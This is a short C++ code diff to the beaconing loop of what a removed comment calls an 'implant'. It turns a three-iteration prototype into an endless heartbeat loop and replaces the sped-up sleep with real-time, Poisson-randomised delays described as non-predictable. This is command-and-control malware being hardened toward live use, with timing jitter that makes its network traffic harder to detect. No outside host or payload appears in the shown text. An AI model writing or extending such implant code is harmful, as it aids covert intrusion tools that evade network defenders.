@@ -27,17 +27,13 @@ void Core::start_beaconing() {
     // Target average: 1 heartbeat every 60 seconds
     double lambda = 1.0 / 60.0;
 
-    // For the prototype, we'll only run a few iterations
-    for(int i = 0; i < 3; ++i) {
-        if (!m_running) break;
-
+    while (m_running) {
         send_heartbeat();
 
         double delay = get_poisson_delay(lambda);
-        // std::cout << "[*] Next heartbeat in " << delay << " seconds." << std::endl;
 
-        // In a real implant, we'd use a more stealthy sleep mechanism
-        std::this_thread::sleep_for(std::chrono::milliseconds(static_cast<long>(delay * 100))); // Speeded up for prototype
+        // Use nanoseconds for precise, non-predictable sleeping
+        std::this_thread::sleep_for(std::chrono::nanoseconds(static_cast<long>(delay * 1e9)));
     }
 }
 
